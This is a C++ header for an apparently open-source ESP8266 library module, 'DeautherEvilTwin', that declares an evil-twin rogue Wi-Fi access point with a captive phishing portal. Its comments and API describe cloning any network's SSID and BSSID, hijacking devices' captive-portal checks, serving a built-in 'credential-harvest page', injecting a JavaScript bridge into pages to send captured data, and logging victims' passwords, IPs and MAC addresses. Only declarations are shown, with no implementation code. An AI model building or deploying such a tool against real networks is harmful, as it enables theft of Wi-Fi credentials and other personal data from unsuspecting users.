/* DeautherX-lib — https://github.com/BlackTechX011/DeautherX-lib
   MIT License

   DeautherEvilTwin — Pro Captive Portal Engine

   Merges EvilTwin (DeautherX) + RogueAP into one fully-configurable module.

   Features:
     ● Clone any SSID with custom BSSID, channel, hidden mode, optional WPA2
     ● Pause / resume AP without losing config
     ● Built-in DNS captive portal (catches Android, iOS, Windows auto-detect)
     ● mDNS registration (deauth.me)
     ● Built-in sleek credential-harvest page OR fully custom HTML
     ● JavaScript bridge API (window.DeautherAPI) injected into every page —
       custom pages can call DeautherAPI.submit(data) to send JSON payloads
     ● Data storage: up to MAX_CAPTURES entries, each with timestamp, client IP,
       client MAC, payload type, and key/value data
     ● Connected-client list with IP→MAC resolution
     ● Callbacks for: credential captured, any data submitted, client connected
*/

#pragma once

#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <functional>

extern "C" {
#include "user_interface.h"
}

// ─── Data Capture Entry ───────────────────────────────────────────────────────

/**
 * CapturedData — a single captured submission from a victim device.
 */
struct CapturedData {
    unsigned long timestamp;    ///< millis() when captured
    char          ip[16];       ///< Client IP address string
    uint8_t       mac[6];       ///< Client MAC address
    char          type[16];     ///< Data type: "password", "form", "custom", etc.
    String        payload;      ///< JSON string of captured data (key-value pairs)
};

// ─── Portal Config ────────────────────────────────────────────────────────────

/**
 * PortalConfig — Full configuration for the rogue AP + captive portal.
 */
struct PortalConfig {
    // ── AP Settings (from v3 RogueAP) ──
    const char* ssid      = "Free WiFi";  ///< SSID to broadcast
    const char* password  = nullptr;      ///< nullptr = Open; set for WPA2
    uint8_t     channel   = 1;            ///< WiFi channel 1-14
    bool        hidden    = false;        ///< Hidden SSID
    uint8_t     bssid[6]  = {0};          ///< Custom BSSID (all-zero = auto)

    // ── Captive Portal Settings ──
    const char* customHtml     = nullptr; ///< Full custom HTML (replaces default page)
    const char* successHtml    = nullptr; ///< Custom success/post-submit page HTML
    const char* portalTitle    = "WiFi Login"; ///< Page <title> for default page
    const char* mdnsHostname   = "portal";     ///< mDNS hostname (portal.local)
    bool        injectJsApi    = true;    ///< Inject window.DeautherAPI into pages
};

// ─── Main Class ───────────────────────────────────────────────────────────────

class DeautherEvilTwin {
public:
    // Limits
    static const uint8_t MAX_CAPTURES   = 64;
    static const uint8_t MAX_ROUTES     = 16;

    // ── Callback types ────────────────────────────────────────────────────────
    using CredentialCb = std::function<void(const String& ssid, const String& password)>;
    using DataCb       = std::function<void(const CapturedData& data)>;
    using ClientCb     = std::function<void(const uint8_t* mac, IPAddress ip)>;
    using RequestCb    = std::function<void(ESP8266WebServer& server)>;

    DeautherEvilTwin();
    ~DeautherEvilTwin();

    // ─── Lifecycle ────────────────────────────────────────────────────────────

    /** Start the rogue AP with full config */
    void start(const PortalConfig& cfg);

    /** Start with simple defaults (just an SSID) */
    void start(const char* ssid, uint8_t ch = 1);

    /** Stop everything — AP, DNS, HTTP */
    void stop();

    /** Pause AP (keeps config; stops broadcasting) */
    void pause();

    /** Resume AP after pause */
    void resume();

    /** Main loop — call every loop() iteration */
    void update();

    // ─── State ────────────────────────────────────────────────────────────────

    bool    isRunning()       const;
    bool    isPaused()        const;
    String  getSSID()         const;
    uint8_t getChannel()      const;
    const uint8_t* getBSSID() const;

    // ─── Custom Routes ────────────────────────────────────────────────────────

    /**
     * Register a custom HTTP route with your own handler.
     * Use this for multi-page phishing flows, surveys, login forms, etc.
     *
     * @param uri     URL path (e.g. "/login", "/survey")
     * @param method  HTTP_GET, HTTP_POST, or HTTP_ANY
     * @param handler Callback receiving the ESP8266WebServer reference
     */
    void addRoute(const char* uri, HTTPMethod method, RequestCb handler);

    /**
     * Serve raw HTML at a specific path (simpler than addRoute).
     * The JS API bridge is auto-injected if enabled in config.
     */
    void servePage(const char* uri, const char* html);

    // ─── Captured Data ────────────────────────────────────────────────────────

    uint8_t            getCaptureCount()       const;
    const CapturedData* getCapture(uint8_t i)  const;
    const CapturedData* getLastCapture()       const;
    String             getLastPassword()       const;
    void               clearCaptures();

    /** Export all captured data as a JSON array string */
    String exportCapturesJSON() const;

    /** Print all captures to Serial */
    void   printCaptures()      const;

    // ─── Connected Clients ────────────────────────────────────────────────────

    /** Get the number of currently connected stations */
    uint8_t getClientCount() const;

    /** Resolve a connected client's MAC from their IP */
    bool clientMacFromIP(IPAddress ip, uint8_t* macOut) const;

    /** Print connected clients (IP + MAC) to Serial */
    void printClients() const;

    // ─── Callbacks ────────────────────────────────────────────────────────────

    /** Called when a password-type credential is captured */
    void onCredential(CredentialCb cb);

    /** Called when ANY data submission is received (form, custom, JS API) */
    void onData(DataCb cb);

    /** Called when a new WiFi client connects to the AP */
    void onClientConnect(ClientCb cb);

    // ─── JS API Bridge ───────────────────────────────────────────────────────

    /**
     * The injected JavaScript provides:
     *
     *   window.DeautherAPI = {
     *       submit(data)          — POST JSON data to /api/submit
     *       submitForm(formId)    — Serialize a form and submit via API
     *       getSSID()             — Returns the cloned SSID
     *       getClientIP()         — Returns client's IP (from portal)
     *       redirect(url)         — Redirect after capture
     *       onSuccess(cb)         — Register callback after successful submit
     *   };
     *
     * Custom HTML pages can use this API to send any data to the ESP.
     */

private:
    PortalConfig      _cfg;
    bool              _running       = false;
    bool              _paused        = false;
    uint8_t           _actual_bssid[6];

    CapturedData*     _captures      = nullptr;
    uint8_t           _capture_count = 0;
    String            _last_password;

    DNSServer*        _dns           = nullptr;
    ESP8266WebServer* _server        = nullptr;

    CredentialCb      _cred_cb       = nullptr;
    DataCb            _data_cb       = nullptr;
    ClientCb          _client_cb     = nullptr;

    uint8_t           _last_client_count = 0;

    // Custom route registry
    struct RouteEntry {
        const char* uri;
        HTTPMethod  method;
        RequestCb   handler;
    };
    RouteEntry _routes[MAX_ROUTES];
    uint8_t    _route_count = 0;

    // Internal pages served as raw HTML
    struct PageEntry {
        const char* uri;
        String      html;
    };
    PageEntry _pages[MAX_ROUTES];
    uint8_t   _page_count = 0;

    // Internal setup
    void    _setupServer();
    void    _checkNewClients();
    String  _injectJsApi(const String& html) const;
    String  _buildDefaultPortalHTML() const;
    String  _buildSuccessHTML() const;
    void    _recordCapture(const char* type, const String& payload);

    // Route handlers
    void    _handleRoot();
    void    _handleSubmitForm();
    void    _handleApiSubmit();
    void    _handleApiStatus();
    void    _handleCaptiveCheck();
    void    _handleNotFound();
};
